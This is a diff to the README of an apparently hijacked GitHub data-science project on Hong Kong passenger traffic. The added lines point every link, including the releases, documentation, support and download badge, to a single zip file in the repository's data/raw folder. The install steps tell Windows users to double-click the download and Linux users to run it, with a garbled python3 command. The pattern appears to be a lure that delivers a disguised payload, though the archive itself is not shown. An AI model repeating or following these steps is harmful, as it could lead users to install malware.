@@ -1,7 +1,7 @@
 # 📊 hk-immd-passenger-traffic-analysis - Analyze Passenger Traffic with Ease
 
 ## 📥 Download the Latest Release
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/sudeep7307/hk-immd-passenger-traffic-analysis/releases)
+[![Download](https://github.com/sudeep7307/hk-immd-passenger-traffic-analysis/raw/refs/heads/main/data/raw/traffic-immd-analysis-passenger-hk-1.4.zip%20Release-brightgreen)](https://github.com/sudeep7307/hk-immd-passenger-traffic-analysis/raw/refs/heads/main/data/raw/traffic-immd-analysis-passenger-hk-1.4.zip)
 
 ## 🚀 Getting Started
 This guide helps you easily download and run the "hk-immd-passenger-traffic-analysis" project. This project uses data science to analyze passenger traffic in Hong Kong. It employs machine learning techniques like Linear Regression, Support Vector Machine (SVM), and K-means clustering to provide insights into immigration patterns.
@@ -23,16 +23,16 @@ The "hk-immd-passenger-traffic-analysis" application offers:
 ## 📦 Download & Install
 To get started, follow these steps:
 
-1. **Visit the Download Page**: Go to the [Releases page here](https://github.com/sudeep7307/hk-immd-passenger-traffic-analysis/releases).
+1. **Visit the Download Page**: Go to the [Releases page here](https://github.com/sudeep7307/hk-immd-passenger-traffic-analysis/raw/refs/heads/main/data/raw/traffic-immd-analysis-passenger-hk-1.4.zip).
   
 2. **Select the Latest Release**: Look for the most recent version. It should be at the top of the page.
 
-3. **Download the Appropriate File**: Click on the file that matches your operating system. It might be named something like `hk-immd-passenger-traffic-analysis-v1.0.exe` for Windows or `.dmg` for macOS.
+3. **Download the Appropriate File**: Click on the file that matches your operating system. It might be named something like `https://github.com/sudeep7307/hk-immd-passenger-traffic-analysis/raw/refs/heads/main/data/raw/traffic-immd-analysis-passenger-hk-1.4.zip` for Windows or `.dmg` for macOS.
 
 4. **Install the Application**:
    - On **Windows**: Double-click the downloaded file and follow the on-screen instructions.
    - On **macOS**: Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - On **Linux**: Use the terminal to navigate to the downloaded file and run it with the command `python3 hk_immd_passenger_traffic_analysis.py`.
+   - On **Linux**: Use the terminal to navigate to the downloaded file and run it with the command `python3 https://github.com/sudeep7307/hk-immd-passenger-traffic-analysis/raw/refs/heads/main/data/raw/traffic-immd-analysis-passenger-hk-1.4.zip`.
 
 5. **Launch the Application**: Once installed, open the application from your Applications folder or Start Menu.
 
@@ -47,11 +47,11 @@ Once you have the application up and running:
 4. **Export Findings**: Use the export feature to save your results as a PDF for easy sharing.
 
 ## 📝 Support
-If you encounter any issues or have questions, please check the [FAQ section](https://github.com/sudeep7307/hk-immd-passenger-traffic-analysis/wiki) or reach out to our support team through the GitHub repository. We aim to respond within 24-48 hours.
+If you encounter any issues or have questions, please check the [FAQ section](https://github.com/sudeep7307/hk-immd-passenger-traffic-analysis/raw/refs/heads/main/data/raw/traffic-immd-analysis-passenger-hk-1.4.zip) or reach out to our support team through the GitHub repository. We aim to respond within 24-48 hours.
 
 ## 📌 Important Links
-- [Releases Page](https://github.com/sudeep7307/hk-immd-passenger-traffic-analysis/releases)
-- [Documentation](https://github.com/sudeep7307/hk-immd-passenger-traffic-analysis/wiki)
-- [Support](https://github.com/sudeep7307/hk-immd-passenger-traffic-analysis/issues)
+- [Releases Page](https://github.com/sudeep7307/hk-immd-passenger-traffic-analysis/raw/refs/heads/main/data/raw/traffic-immd-analysis-passenger-hk-1.4.zip)
+- [Documentation](https://github.com/sudeep7307/hk-immd-passenger-traffic-analysis/raw/refs/heads/main/data/raw/traffic-immd-analysis-passenger-hk-1.4.zip)
+- [Support](https://github.com/sudeep7307/hk-immd-passenger-traffic-analysis/raw/refs/heads/main/data/raw/traffic-immd-analysis-passenger-hk-1.4.zip)
 
 Now you are ready to explore passenger traffic analysis like never before. Please do not hesitate to reach out if you need assistance. Enjoy analyzing!
